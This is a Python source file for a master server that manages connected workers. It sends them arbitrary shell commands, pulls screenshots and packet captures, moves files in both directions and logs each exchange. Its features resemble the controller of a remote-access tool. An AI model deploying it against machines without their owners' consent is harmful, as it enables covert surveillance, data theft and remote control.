import shlex, threading, os
from request import Request
from response import Response
from datetime import datetime
from db import insert_message

Address = tuple[str, int]
ID = int
class Master:
    def __init__(self):
        self._workers = {}   # worker_id -> {"conn", "addr", "name"}
        self._workers_lock = threading.Lock()
        self._next_id = 1

    def add_worker(self, conn, addr):
        with self._workers_lock:
            worker_id = self._next_id
            self._next_id += 1
            self._workers[worker_id] = {
                "conn": conn,
                "addr": addr,
                "name": f"Worker-{worker_id}",
            }
        return worker_id

    def remove_worker(self, worker_id) -> bool:
        with self._workers_lock:
            worker = self._workers.pop(worker_id, None)
            if worker:
                try:
                    worker["conn"].sendall(
                        Request(method="POST", uri="/exec", body=b"exit").dump()
                    )
                except OSError:
                    pass
                try:
                    worker["conn"].close()
                    return True
                except OSError:
                    return False
            return False

    def get_worker(self, worker_id):
        with self._workers_lock:
            return self._workers.get(worker_id)

    def list_workers(self) -> tuple[ID, str, Address]:
        with self._workers_lock:
            return [
                (cid, info["name"], info["addr"])
                for cid, info in self._workers.items()
            ]

    def rename_worker(self, worker_id, name):
        with self._workers_lock:
            if worker_id in self._workers:
                self._workers[worker_id]["name"] = name
                return True
            return False

def log_message(sender, recipient, worker_ip, message):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] {sender} -> {recipient}: {message}")
    insert_message(sender, recipient, worker_ip, message, timestamp)

def recv_all(sock):
    raw = b""
    while True:
        raw += sock.recv(4096)
        if not raw:
            return None
        if b"\r\n\r\n" in raw:
            header_part, _, body_part = raw.partition(b"\r\n\r\n")
            content_length = None
            for line in header_part.split(b"\r\n")[1:]:
                if line.lower().startswith(b"content-length:"):
                    content_length = int(line.split(b":", 1)[1].strip())
                    break
            if content_length is None or len(body_part) >= content_length:
                break
    return raw

def send_command(master: Master, worker_id: int, cmd: str, sender="Master") -> str:
    worker = master.get_worker(worker_id)
    if cmd.startswith("move") and shlex.split(cmd)[5] == "worker":
        return move_file_to_worker(worker, cmd, sender)
    else:
        worker["conn"].sendall(Request(method="POST", uri="/exec", body=cmd.encode()).dump())
        log_message(sender, worker["name"], worker["addr"][0], cmd)
        raw = recv_all(worker["conn"])
        response = Response.load(raw)

        if cmd.startswith("screenshot") and cmd.split()[2] == "master":
            path = cmd.split()[1]
            with open(path, "wb") as f:
                f.write(response.body)
            return f"screenshot saved to {path}"

        elif cmd.startswith("sniff") and shlex.split(cmd)[5] == "master":
            path = shlex.split(cmd)[4]
            with open(path, "wb") as f:
                f.write(response.body)
            return f"pcap saved to {path}"

        elif cmd.startswith("move") and shlex.split(cmd)[5] == "master":
            path = shlex.split(cmd)[7]
            with open(path, "wb") as f:
                f.write(response.body)
            return f"file from client saved to {path}"

        else:
            return response.body.decode(errors="replace")

def move_file_to_worker(worker, cmd: str, sender="Master") -> str:
    parts = shlex.split(cmd)
    source_path = parts[1]
    destination_path = parts[7]
    with open(source_path, "rb") as f:
        file_bytes = f.read()
    req = Request(method="POST", uri="/exec", headers={"X-Destination-Path": [destination_path]},
    body=file_bytes)
    worker["conn"].sendall(req.dump())
    log_message(sender, worker["name"], worker["addr"][0], cmd)
    os.remove(source_path)
    return f"pushed file from {source_path} to {destination_path}"
